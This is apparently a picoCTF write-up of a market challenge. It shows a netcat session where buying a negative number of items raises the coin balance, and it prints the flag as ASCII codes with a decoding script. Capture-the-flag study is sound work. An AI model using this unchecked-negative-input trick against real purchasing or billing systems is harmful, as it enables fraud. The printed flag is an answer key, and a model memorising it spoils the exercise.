# 43 Solution
The `source` file is a 32 bit ELF file. It can be passed through a decompiler to view the source code.

Within the source code, there is a line:

`vuln: doesn't check if the value is negative so we can buy a negative amount`

This is an overflow oversight that we can take advantage of. Open up the connection to the server with the provided netcat command:
```
$ nc mercury.picoctf.net 10337
Welcome to the market!
=====================
You have 40 coins
	Item		Price	Count
(0) Quiet Quiches	10	12
(1) Average Apple	15	8
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
1
How many do you want to buy?
-10
You have 190 coins
	Item		Price	Count
(0) Quiet Quiches	10	12
(1) Average Apple	15	18
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 51 100 97 51 52 97 56 102 125]
```

The flag is provided as a sequence of ASCII characters, which can be converted to a string with a Python script.

```
nums = # List of nums here
flag = ""
for num in nums:
    flag += chr(int(num))
print(flag)
```